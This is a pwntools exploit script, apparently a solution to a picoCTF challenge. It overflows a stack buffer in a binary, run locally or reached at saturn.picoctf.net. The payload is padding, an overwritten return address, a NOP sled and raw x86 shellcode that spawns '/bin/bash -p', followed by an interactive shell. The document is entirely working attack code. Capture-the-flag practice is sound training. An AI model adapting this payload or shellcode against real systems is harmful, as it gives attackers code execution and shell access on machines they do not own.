#!/usr/bin/env python3

from pwn import *
import argparse

if __name__ == "__main__":
	parser = argparse.ArgumentParser(prog="", description="")
	parser.add_argument("-l", "--local", action="store_true")
	parser.add_argument("-r", "--remote", action="store_true")
	args = parser.parse_args()

	if args.local:
		proc = process(["./vuln"])
	elif args.remote:
		proc = process(["nc", "saturn.picoctf.net", "57116"])
	else:
		print("[!] Use either --local or --remote")
		exit()

	context.log_level = "debug"
	
	payload = b"\xff\xe4"
	payload += b"A" * 26
	payload += p32(0x805334b)
	payload += b"\x90" * 64
	payload += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

	info("Sending payload")
	proc.sendlineafter(b"How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n", payload)
	proc.interactive()